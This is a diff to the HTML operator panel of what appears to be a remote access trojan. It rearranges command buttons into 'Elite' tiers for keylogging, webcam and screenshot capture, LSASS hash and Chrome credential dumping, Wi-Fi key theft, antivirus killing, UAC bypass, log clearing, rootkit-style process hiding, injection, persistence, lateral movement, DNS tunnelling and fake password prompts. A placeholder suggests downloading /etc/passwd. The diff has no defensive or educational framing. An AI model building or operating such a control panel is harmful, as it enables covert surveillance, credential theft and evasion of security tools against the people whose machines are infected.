@@ -143,45 +143,44 @@
                         <button class="cat-btn" data-category="custom">⌨️ Custom</button>
                     </div>
                     
-                    <!-- Control & Exploit - Most Ruthless Commands First -->
-                    <div id="securityCommands" class="command-group active">
-                        <h3>🔥 Control & Exploit (19 commands)</h3>
+                    <!-- Elite Commands - Tier 1: Core Commands -->
+                    <div id="eliteTier1Commands" class="command-group active">
+                        <h3>⚡ Elite Tier 1: Core Commands (6)</h3>
                         <div class="command-buttons">
-                            <button class="cmd-btn" data-command="keylogger status" title="Check keylogger status">Keylog Status</button>
-                            <button class="cmd-btn" data-command="keylogger start" title="Start keylogger">Keylog Start</button>
-                            <button class="cmd-btn" data-command="keylogger stop" title="Stop keylogger">Keylog Stop</button>
-                            <button class="cmd-btn" data-command="keylogger dump" title="Dump recorded keystrokes">Keylog Dump</button>
-                            <button class="cmd-btn" data-command="screenshot" title="Capture screenshot">Screenshot</button>
-                            <button class="cmd-btn" data-command="webcamlist" title="List connected webcams">Webcam List</button>
-                            <button class="cmd-btn" data-command="webcamsnap" data-with-params="true" title="Take webcam picture (device)">Webcam Snap</button>
-                            <button class="cmd-btn" data-command="avscan" title="Scan for antivirus software">AV Scan</button>
-                            <button class="cmd-btn" data-command="avkill" title="Terminate antivirus processes">AV Kill</button>
-                            <button class="cmd-btn" data-command="hashdump" title="Grab password hashes">Hash Dump</button>
-                            <button class="cmd-btn" data-command="wifikeys" title="Display saved WiFi passwords">WiFi Keys</button>
-                            <button class="cmd-btn" data-command="freeze status" title="Check input freeze status">Freeze Status</button>
-                            <button class="cmd-btn" data-command="freeze start" title="Freeze mouse and keyboard">Freeze Start</button>
-                            <button class="cmd-btn" data-command="freeze stop" title="Unfreeze mouse and keyboard">Freeze Stop</button>
-                            <button class="cmd-btn" data-command="popup" title="Display custom popup message">Popup</button>
-                            <button class="cmd-btn" data-command="displayoff" title="Turn off display monitors">Display Off</button>
-                            <button class="cmd-btn" data-command="displayon" title="Turn on display monitors">Display On</button>
-                            <button class="cmd-btn" data-command="lockscreen" title="Lock system screen">Lock Screen</button>
-                            <button class="cmd-btn" data-command="logintext" title="Set login screen text">Login Text</button>
+                            <button class="cmd-btn" data-command="elite_ls" title="Elite directory listing with ADS detection">Elite LS</button>
+                            <button class="cmd-btn" data-command="elite_download" data-with-params="true" title="Elite file download with encryption">Elite Download</button>
+                            <button class="cmd-btn" data-command="elite_upload" data-with-params="true" title="Elite file upload with integrity checks">Elite Upload</button>
+                            <button class="cmd-btn" data-command="elite_shell" data-with-params="true" title="Elite shell execution with direct APIs">Elite Shell</button>
+                            <button class="cmd-btn" data-command="elite_ps" title="Elite process listing with detailed info">Elite PS</button>
+                            <button class="cmd-btn" data-command="elite_kill" data-with-params="true" title="Elite process termination">Elite Kill</button>
+                        </div>
+                    </div>
+
+                    <!-- Elite Commands - Credential & Data -->
+                    <div id="eliteCredentialCommands" class="command-group">
+                        <h3>🔐 Elite Credential & Data Commands (5)</h3>
+                        <div class="command-buttons">
+                            <button class="cmd-btn" data-command="elite_hashdump" title="Elite password hash extraction from LSASS">Elite Hash Dump</button>
+                            <button class="cmd-btn" data-command="elite_chromedump" title="Elite Chrome credential extraction">Elite Chrome Dump</button>
+                            <button class="cmd-btn" data-command="elite_wifikeys" title="Elite WiFi password extraction">Elite WiFi Keys</button>
+                            <button class="cmd-btn" data-command="elite_screenshot" title="Elite screenshot capture with stealth">Elite Screenshot</button>
+                            <button class="cmd-btn" data-command="elite_keylogger" data-with-params="true" title="Elite keylogger with advanced features">Elite Keylogger</button>
                         </div>
                     </div>
                     
-                    <!-- Windows-Specific Attacks -->
-                    <div id="windowsCommands" class="command-group">
-                        <h3>🪟 Windows-Specific (9 commands)</h3>
+                    <!-- Elite Commands - Advanced Stealth -->
+                    <div id="eliteStealthCommands" class="command-group">
+                        <h3>🥷 Elite Advanced Stealth Commands (9)</h3>
                         <div class="command-buttons">
-                            <button class="cmd-btn" data-command="chromedump" title="Retrieve Chrome saved passwords">Chrome Dump</button>
-                            <button class="cmd-btn" data-command="clearev" title="Clear Windows event logs">Clear Events</button>
-                            <button class="cmd-btn" data-command="scanreg" title="Display Registry information">Scan Registry</button>
-                            <button class="cmd-btn" data-command="disableRDP" title="Disable Remote Desktop Protocol">Disable RDP</button>
-                            <button class="cmd-btn" data-command="enableRDP" title="Enable Remote Desktop Protocol">Enable RDP</button>
-                            <button class="cmd-btn" data-command="disableUAC" title="Disable User Account Control">Disable UAC</button>
-                            <button class="cmd-btn" data-command="enableUAC" title="Enable User Account Control">Enable UAC</button>
-                            <button class="cmd-btn" data-command="disableWindef" title="Disable Windows Defender">Disable Defender</button>
-                            <button class="cmd-btn" data-command="enableWindef" title="Enable Windows Defender">Enable Defender</button>
+                            <button class="cmd-btn" data-command="elite_hidefile" data-with-params="true" title="Elite file hiding with multiple techniques">Elite Hide File</button>
+                            <button class="cmd-btn" data-command="elite_hideprocess" data-with-params="true" title="Elite process hiding with rootkit techniques">Elite Hide Process</button>
+                            <button class="cmd-btn" data-command="elite_clearlogs" data-with-params="true" title="Elite log clearing with anti-forensics">Elite Clear Logs</button>
+                            <button class="cmd-btn" data-command="elite_firewall" data-with-params="true" title="Elite firewall control with bypass techniques">Elite Firewall</button>
+                            <button class="cmd-btn" data-command="elite_escalate" data-with-params="true" title="Elite privilege escalation with UAC bypass">Elite Escalate</button>
+                            <button class="cmd-btn" data-command="elite_clearev" data-with-params="true" title="Elite event log clearing with advanced cleanup">Elite Clear Events</button>
+                            <button class="cmd-btn" data-command="elite_avkill" data-with-params="true" title="Elite antivirus disabling with multiple methods">Elite AV Kill</button>
+                            <button class="cmd-btn" data-command="elite_avscan" title="Elite AV and security software detection">Elite AV Scan</button>
+                            <button class="cmd-btn" data-command="elite_scanreg" data-with-params="true" title="Elite registry scanning and analysis">Elite Scan Registry</button>
                         </div>
                     </div>
                     
@@ -203,34 +202,48 @@
                         </div>
                     </div>
                     
-                    <div id="networkCommands" class="command-group">
-                        <h3>🌐 Network (8 commands)</h3>
+                    <!-- Elite Commands - Advanced Features -->
+                    <div id="eliteAdvancedCommands" class="command-group">
+                        <h3>🚀 Elite Advanced Features (5)</h3>
                         <div class="command-buttons">
-                            <button class="cmd-btn" data-command="ipconfig" title="Display network configuration">IP Config</button>
-                            <button class="cmd-btn" data-command="firewall status" title="Check firewall status">Firewall Status</button>
-                            <button class="cmd-btn" data-command="firewall open" data-with-params="true" title="Open firewall port (port in/out tcp/udp)">Firewall Open</button>
-                            <button class="cmd-btn" data-command="firewall close" data-with-params="true" title="Close firewall port (port in/out tcp/udp)">Firewall Close</button>
-                            <button class="cmd-btn" data-command="hostsfile show" title="Display hosts file">Show Hosts</button>
-                            <button class="cmd-btn" data-command="hostsfile update" data-with-params="true" title="Update hosts entry (hostname ip)">Update Hosts</button>
-                            <button class="cmd-btn" data-command="hostsfile remove" data-with-params="true" title="Remove hosts entry (hostname)">Remove Hosts</button>
-                            <button class="cmd-btn" data-command="ssh" title="Open SSH connection">SSH</button>
+                            <button class="cmd-btn" data-command="elite_inject" data-with-params="true" title="Elite process injection with multiple techniques">Elite Inject</button>
+                            <button class="cmd-btn" data-command="elite_migrate" data-with-params="true" title="Elite process migration with memory transfer">Elite Migrate</button>
+                            <button class="cmd-btn" data-command="elite_vmscan" title="Elite VM and sandbox detection">Elite VM Scan</button>
+                            <button class="cmd-btn" data-command="elite_port_forward" data-with-params="true" title="Elite network tunneling and port forwarding">Elite Port Forward</button>
+                            <button class="cmd-btn" data-command="elite_persistence" data-with-params="true" title="Elite persistence mechanisms">Elite Persistence</button>
+                        </div>
+                    </div>
+
+                    <!-- Elite Commands - Network & Social Engineering -->
+                    <div id="eliteNetworkCommands" class="command-group">
+                        <h3>🌐 Elite Network & Social Engineering (6)</h3>
+                        <div class="command-buttons">
+                            <button class="cmd-btn" data-command="elite_hostsfile" data-with-params="true" title="Elite hosts file manipulation">Elite Hosts File</button>
+                            <button class="cmd-btn" data-command="elite_askpassword" data-with-params="true" title="Elite social engineering password collection">Elite Ask Password</button>
+                            <button class="cmd-btn" data-command="elite_crackpassword" data-with-params="true" title="Elite password cracking with multiple methods">Elite Crack Password</button>
+                            <button class="cmd-btn" data-command="elite_dns_tunnel" data-with-params="true" title="Elite DNS tunneling for covert communication">Elite DNS Tunnel</button>
+                            <button class="cmd-btn" data-command="elite_lateral" data-with-params="true" title="Elite lateral movement techniques">Elite Lateral</button>
+                            <button class="cmd-btn" data-command="elite_ssh" data-with-params="true" title="Elite SSH operations and tunneling">Elite SSH</button>
                         </div>
                     </div>
                     
-                    <!-- System Information - Reconnaissance -->
-                    <div id="systemCommands" class="command-group">
-                        <h3>📊 System Information (9 commands)</h3>
+                    <!-- Elite Commands - System Control & Manipulation -->
+                    <div id="eliteSystemControlCommands" class="command-group">
+                        <h3>🎛️ Elite System Control & Manipulation (5)</h3>
                         <div class="command-buttons">
-                            <button class="cmd-btn" data-command="sysinfo" title="Complete system information">System Info</button>
-                            <button class="cmd-btn" data-command="environment" title="Display environment variables">Environment</button>
-                            <button class="cmd-btn" data-command="ps" title="List all running processes">Processes</button>
-                            <button class="cmd-btn" data-command="lsmod" title="List installed drivers/kernel modules">List Modules</button>
-                            <button class="cmd-btn" data-command="drives" title="Display drive information">Drives</button>
-                            <button class="cmd-btn" data-command="location" title="Get public IP and geo-location">Location</button>
-                            <button class="cmd-btn" data-command="vmscan" title="Detect virtual machine">VM Scan</button>
-                            <button class="cmd-btn" data-command="pwd" title="Print working directory">Working Dir</button>
-                            <button class="cmd-btn" data-command="ls" title="List files and directories">List Files</button>
-                            <button class="cmd-btn" data-command="dir" data-with-params="true" title="Windows dir alias">Dir (Win)</button>
+                            <button class="cmd-btn" data-command="elite_freeze" data-with-params="true" title="Elite system freezing techniques">Elite Freeze</button>
+                            <button class="cmd-btn" data-command="elite_popup" data-with-params="true" title="Elite popup and notification system">Elite Popup</button>
+                            <button class="cmd-btn" data-command="elite_lockscreen" data-with-params="true" title="Elite screen locking and session control">Elite Lock Screen</button>
+                            <button class="cmd-btn" data-command="elite_logintext" data-with-params="true" title="Elite login screen text manipulation">Elite Login Text</button>
+                            <button class="cmd-btn" data-command="elite_sudo" data-with-params="true" title="Elite privilege escalation and UAC bypass">Elite Sudo</button>
+                        </div>
+                    </div>
+
+                    <!-- Elite Commands - Persistence Mechanisms -->
+                    <div id="elitePersistenceCommands" class="command-group">
+                        <h3>🔒 Elite Persistence Mechanisms (1)</h3>
+                        <div class="command-buttons">
+                            <button class="cmd-btn" data-command="elite_persist" data-with-params="true" title="Elite advanced persistence mechanisms">Elite Persist</button>
                         </div>
                     </div>
                     
@@ -266,12 +279,48 @@
                         </div>
                     </div>
                     
+                    <!-- Elite Commands - Remaining System Information -->
+                    <div id="eliteSystemInfoCommands" class="command-group">
+                        <h3>📊 Elite System Information (13)</h3>
+                        <div class="command-buttons">
+                            <button class="cmd-btn" data-command="elite_systeminfo" title="Elite comprehensive system information">Elite Sysinfo</button>
+                            <button class="cmd-btn" data-command="elite_whoami" title="Elite user identification with privileges">Elite Whoami</button>
+                            <button class="cmd-btn" data-command="elite_hostname" title="Elite hostname with FQDN and network info">Elite Hostname</button>
+                            <button class="cmd-btn" data-command="elite_network" title="Elite network information gathering">Elite Network</button>
+                            <button class="cmd-btn" data-command="elite_processes" title="Elite process enumeration with detailed info">Elite Processes</button>
+                            <button class="cmd-btn" data-command="elite_privileges" title="Elite privilege enumeration and analysis">Elite Privileges</button>
+                            <button class="cmd-btn" data-command="elite_username" title="Elite user identification with session info">Elite Username</button>
+                            <button class="cmd-btn" data-command="elite_installedsoftware" title="Elite software enumeration with vulnerability analysis">Elite Software</button>
+                            <button class="cmd-btn" data-command="elite_environment" data-with-params="true" title="Elite environment variable analysis">Elite Environment</button>
+                            <button class="cmd-btn" data-command="elite_drives" title="Elite drive enumeration with forensic details">Elite Drives</button>
+                            <button class="cmd-btn" data-command="elite_location" title="Elite geolocation and network positioning">Elite Location</button>
+                            <button class="cmd-btn" data-command="elite_lsmod" data-with-params="true" title="Elite loaded module enumeration">Elite Lsmod</button>
+                            <button class="cmd-btn" data-command="elite_fileinfo" data-with-params="true" title="Elite file metadata analysis">Elite Fileinfo</button>
+                        </div>
+                    </div>
+
+                    <!-- Elite Commands - Filesystem Operations -->
+                    <div id="eliteFilesystemCommands" class="command-group">
+                        <h3>📁 Elite Filesystem Commands (9)</h3>
+                        <div class="command-buttons">
+                            <button class="cmd-btn" data-command="elite_cd" data-with-params="true" title="Elite directory change with MRU clearing">Elite CD</button>
+                            <button class="cmd-btn" data-command="elite_pwd" title="Elite working directory with direct API">Elite PWD</button>
+                            <button class="cmd-btn" data-command="elite_cat" data-with-params="true" title="Elite file read without access time update">Elite Cat</button>
+                            <button class="cmd-btn" data-command="elite_rm" data-with-params="true" title="Elite file deletion with secure wiping">Elite RM</button>
+                            <button class="cmd-btn" data-command="elite_mkdir" data-with-params="true" title="Elite directory creation with stealth">Elite Mkdir</button>
+                            <button class="cmd-btn" data-command="elite_cp" data-with-params="true" title="Elite file copy with integrity verification">Elite CP</button>
+                            <button class="cmd-btn" data-command="elite_mv" data-with-params="true" title="Elite file move with atomic operations">Elite MV</button>
+                            <button class="cmd-btn" data-command="elite_rmdir" data-with-params="true" title="Elite directory removal with secure deletion">Elite Rmdir</button>
+                            <button class="cmd-btn" data-command="elite_touch" data-with-params="true" title="Elite file creation with timestamp manipulation">Elite Touch</button>
+                        </div>
+                    </div>
+
                     <div id="customCommands" class="command-group">
-                        <h3>🛠️ Custom Command</h3>
-                        <p class="help-text" style="margin-bottom: 1rem;">Enter any Stitch command manually. Supports all 75+ commands with parameters.</p>
+                        <h3>🛠️ Custom Elite Command</h3>
+                        <p class="help-text" style="margin-bottom: 1rem;">Enter any Elite command manually. Supports all 63 elite commands with parameters.</p>
                         <div class="command-input-section">
-                            <input type="text" id="customCommandInput" placeholder="e.g., download /etc/passwd, sudo systemctl status, etc...">
-                            <button class="cmd-btn" id="executeCustomBtn">Execute</button>
+                            <input type="text" id="customCommandInput" placeholder="e.g., elite_download /etc/passwd, elite_sudo whoami, etc...">
+                            <button class="cmd-btn" id="executeCustomBtn">Execute Elite</button>
                         </div>
                     </div>
                     
